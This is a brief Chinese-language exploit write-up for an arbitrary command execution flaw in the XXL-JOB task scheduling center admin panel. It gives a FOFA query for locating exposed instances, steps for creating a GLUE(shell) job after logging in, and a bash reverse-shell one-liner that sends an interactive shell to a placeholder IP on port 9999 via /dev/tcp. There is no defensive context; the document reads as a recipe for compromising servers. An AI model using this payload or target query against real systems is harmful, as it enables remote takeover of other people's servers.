# XXL-JOB-任务调度中心-后台任意命令执行漏洞

## 漏洞描述

XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令任务调度获取服务器权限

## 漏洞影响

> [!NOTE]
>
> XXL-JOB

## FOFA

> [!NOTE]
>
> app="XXL-JOB" || title="任务调度中心"

## 漏洞复现

登录后台增加一个任务

![](XXL-JOB-任务调度中心-后台任意命令执行漏洞.assets/1627363083261912.jpg)

> [!NOTE]
>
> 注意运行模式需要为 GLUE(shell)

![](XXL-JOB-任务调度中心-后台任意命令执行漏洞.assets/1627363083521473.jpg)

点击 GLUE IDE编辑脚本

![](XXL-JOB-任务调度中心-后台任意命令执行漏洞.assets/1627363083716641.jpg)

![](XXL-JOB-任务调度中心-后台任意命令执行漏洞.assets/1627363084054791.jpg)

执行探测出网，和任务调用是否可执行

反弹一个shell

```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'
```

![](XXL-JOB-任务调度中心-后台任意命令执行漏洞.assets/1627363084265783.jpg)